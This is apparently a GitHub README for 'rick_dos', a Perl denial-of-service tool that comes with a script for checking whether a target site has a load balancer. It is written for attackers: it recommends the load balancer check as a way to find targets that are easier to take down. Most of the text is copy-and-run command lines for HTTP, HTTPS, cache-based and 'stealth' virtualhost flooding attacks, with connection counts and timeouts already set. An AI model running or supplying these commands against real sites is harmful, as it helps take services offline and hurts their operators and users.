# rick_dos and Load Balancer Check
Tool Write in Python to Make Denial of Service and Verify if Site have Load Balancer

I recomend use Linux to make attack, this tool make SYN flood on DNS

To power up your Denial of Service Attack, use the Load Balancer checker, if the target doesn't have a load balancer configured, the chances of the attack increase significantly

#Install

```
git clone xxxxx

cd rick_dos
sudo chmod +x rickhack.pl rickhack_loadbalancer_check.sh
```

# dependencies
```
sudo apt-get install perl-doc
```

# usage:


**To power up your Denial of Service Attack, use the Load Balancer checker, if the target doesn't have a load balancer configured, the chances of the attack increase significantly

Load Balancer Check:

usage: ./rickhack_loadbalancer_check.sh [domain]
Dont use http or https in name of domain
usage: ./rickhack_loadbalancer_check.sh example.com

```
./rickhack_loadbalancer_check.sh example.com
```

![image](https://user-images.githubusercontent.com/38327991/158487328-fa3be986-7ae3-4033-878b-869acc2d381f.png)


If the target has a load balancer it will appear like this:

![image](https://user-images.githubusercontent.com/38327991/158487613-a44542aa-3604-4147-9974-1d418e3487be.png)



For Help:
```
perldoc ./rickhack.pl
```

For testting the program:
```
./rickhack.pl -dns www.example.com -port 80 -test
```


For HTTP Dos Attack:
```
./rickhack.pl -dns www.example.com -port 80 -timeout 2000 -num 500 -tcpto 5
```

Attack with httpready:
```
./rickhack.pl -dns www.example.com -port 80 -timeout 2000 -num 500 -tcpto 5 -httpready
```

Attack with stealth mode using virtualhost
```
./rickhack.pl -dns www.example.com -port 80 -timeout 30 -num 500 -tcpto 1 -shost www.virtualhost.com
```

Attack on sites with HTTPS, SSL
```
./rickhack.pl -dns www.example.com -port 443 -timeout 30 -num 500 -https
```

Attack with Cache
```
./rickhack.pl -dns www.example.com -port 80 -timeout 30 -num 500 -cache
```


# Glory to Ukraine!!!

![image](https://user-images.githubusercontent.com/38327991/158488171-b2d3fb1a-d100-4940-ac47-a9bd9dc0c2f0.png)
